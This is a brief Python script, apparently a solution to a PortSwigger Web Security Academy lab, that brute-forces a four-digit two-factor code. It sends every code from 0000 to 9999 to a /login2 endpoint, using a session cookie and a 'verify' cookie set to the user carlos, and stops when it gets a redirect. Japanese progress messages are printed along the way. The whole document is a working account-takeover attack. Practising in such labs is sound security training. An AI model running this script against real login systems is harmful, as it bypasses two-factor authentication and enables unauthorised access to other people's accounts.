import requests

base_url = 'https://0ab500160466127881e2844000940031.web-security-academy.net'
login2_url = f'{base_url}/login2'

cookies = {
    'session':'wpAddwvwIP7bSylrFYKKsIfPoTF0BPXs',
    'verify':'carlos'
}

for i in range(10000):
    mfa_code = f'{i:04d}'
    data = {
        'mfa-code':mfa_code
        }
    
    response = requests.post(login2_url, data=data, cookies=cookies, allow_redirects=False)

    if response.status_code == 302:
        print(f'認証コードは{mfa_code}です。')
        break

    if i % 100 == 0:
        print(f"試行中... {mfa_code}")